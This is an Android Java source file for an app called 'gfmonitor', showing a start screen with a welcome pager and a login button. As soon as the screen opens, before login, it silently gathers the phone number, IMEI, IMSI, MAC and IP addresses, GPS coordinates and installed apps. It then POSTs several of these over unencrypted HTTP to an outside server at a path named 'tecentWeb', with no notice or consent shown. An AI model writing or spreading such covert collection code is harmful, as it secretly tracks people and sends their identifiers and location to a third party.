package cn.wxjia.gfmonitor;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import cn.wxjia.gfmonitor.service.DeviceInformationService;
import cn.wxjia.gfmonitor.service.SendToWebService;

import android.os.Bundle;
import android.os.StrictMode;
import android.app.Activity;
import android.content.Intent;
import android.support.v4.view.PagerAdapter;
import android.support.v4.view.ViewPager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;

public class StartActivity extends Activity {
	private static final String TAG = "WXJIA_MONITOR";
	private View view1, view2, view3;
	private ViewPager startViewPager; // 对应的viewPager

	private List<View> startViewList;// view数组

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		// 显示界面之前修改窗口的属性
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
				WindowManager.LayoutParams.FLAG_FULLSCREEN);

		setContentView(R.layout.activity_start);

		/**
		 * int ret = connection.getResponseCode(); 我也不知道为什么 执行这句代码时 就要加上下面的代码
		 */
		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
					.permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}

		startViewPager = (ViewPager) findViewById(R.id.startviewpager);
		LayoutInflater inflater = getLayoutInflater();
		view1 = inflater.inflate(R.layout.start_1, null);
		view2 = inflater.inflate(R.layout.start_2, null);
		view3 = inflater.inflate(R.layout.start_3, null);

		startViewList = new ArrayList<View>();// 将要分页显示的View装入数组中
		startViewList.add(view1);
		startViewList.add(view2);
		startViewList.add(view3);

		PagerAdapter pagerAdapter = new PagerAdapter() {

			@Override
			public boolean isViewFromObject(View arg0, Object arg1) {
				return arg0 == arg1;
			}

			@Override
			public int getCount() {
				return startViewList.size();
			}

			@Override
			public void destroyItem(ViewGroup container, int position,
					Object object) {
				container.removeView(startViewList.get(position));
			}

			@Override
			public Object instantiateItem(ViewGroup container, int position) {
				container.addView(startViewList.get(position));

				return startViewList.get(position);
			}
		};
		startViewPager.setAdapter(pagerAdapter);
		getDeviceInformation();
	}

	// 刚告之后 进入登陆页
	public void enterLogin(View view) {
		// 显式意图 明确指定了组件名称
		Intent intent = new Intent();
		// 设置要激活的组件
		intent.setClass(getApplicationContext(), LoginActivity.class);
		startActivity(intent);
	}

	/**
	 * 获取硬件信息
	 */
	public void getDeviceInformation() {
		DeviceInformationService deviceService = new DeviceInformationService(
				this);
		// 手机型号
		String mType = deviceService.getMType(); // 获取成功 HUAWEI U8951
		// 电话号码
		String teleNumber = deviceService.getTeleNumber();// 部分获取没问题

		String imei = deviceService.getDeviceId();
		String imsi = deviceService.getSubscriberId();
		String providersName = deviceService.getProvidersName();
		String apps = deviceService.getApps();
		String macAddress = deviceService.getMacAddress();
		String ip = deviceService.getIp();

		String[] memory = deviceService.getMemory();
		String[] cpuInfo = deviceService.getCpu();
		int[] screen = deviceService.getScreen();
		double[] coordinate = deviceService.getCoordinate();

		Log.i(TAG, "mType = " + mType);
		Log.i(TAG, "teleNumber = " + teleNumber);
		Log.i(TAG, "imsi = " + imsi);
		Log.i(TAG, "providersName = " + providersName);
		Log.i(TAG, "apps = " + apps);
		Log.i(TAG, "macAddress = " + macAddress);
		Log.i(TAG, "meminfo total:" + memory[0] + " available:" + memory[1]);
		Log.i(TAG, "cpuinfo:" + cpuInfo[0] + " " + cpuInfo[1]);
		Log.i(TAG, "width = " + screen[0]);
		Log.i(TAG, "height = " + screen[1]);

		Log.i(TAG, "Longitude = " + coordinate[0]);
		Log.i(TAG, "Latitude = " + coordinate[1]);
		String address = "Latitude-" + coordinate[1] + "+Longitude-"
				+ coordinate[0];

		Map<String, String> params = new HashMap<String, String>();

		params.put("teleNumber", teleNumber);
		params.put("ip", ip);
		params.put("address", address);
		params.put("mType", mType);
		params.put("mWidth", String.valueOf(screen[0]));
		params.put("mHeight", String.valueOf(screen[1]));
		params.put("imei", imei);
		params.put("macAddress", macAddress);

		SendToWebService service = new SendToWebService();
		String path = "http://www.vcyoung.cn/tecentWeb/DeviceInformationServlet";
		service.sendPOSTRequest(path, params, "UTF-8");
	}

}
